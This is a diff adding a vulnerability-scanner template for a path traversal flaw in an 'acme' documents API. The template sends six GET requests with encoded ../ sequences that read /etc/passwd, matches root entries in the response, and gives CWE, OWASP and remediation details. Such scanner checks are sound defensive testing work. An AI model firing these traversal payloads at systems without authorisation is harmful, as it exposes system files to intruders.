@@ -1,0 +1,22 @@
+id: acme-path-traversal
+info:
+  name: Path Traversal in document name
+  severity: critical
+  tags: [traversal, lfi]
+  description: "A ../ sequence in a document name returned /etc/passwd."
+  remediation: "Reduce names with Path.GetFileName or normalize with Path.GetFullPath and verify the result stays under the document root."
+  cwe: "CWE-22"
+  owasp: "A01:2021-Broken Access Control"
+
+requests:
+  - method: GET
+    paths:
+      - "/api/documents/raw?name=..%2F..%2F..%2Fetc%2Fpasswd"
+      - "/api/documents/preview?name=..%2F..%2F..%2Fetc%2Fpasswd"
+      - "/api/documents/view?name=..%2F..%2F..%2Fetc%2Fpasswd"
+      - "/api/documents/legacy?name=..%2F..%2F..%2Fetc%2Fpasswd"
+      - "/api/documents/download?name=..%2F..%2F..%2Fetc%2Fpasswd"
+      - "/api/documents/open?name=..%2F..%2F..%2Fetc%2Fpasswd"
+    matchers:
+      - type: regex
+        regex: ["root:.*:0:0:"]
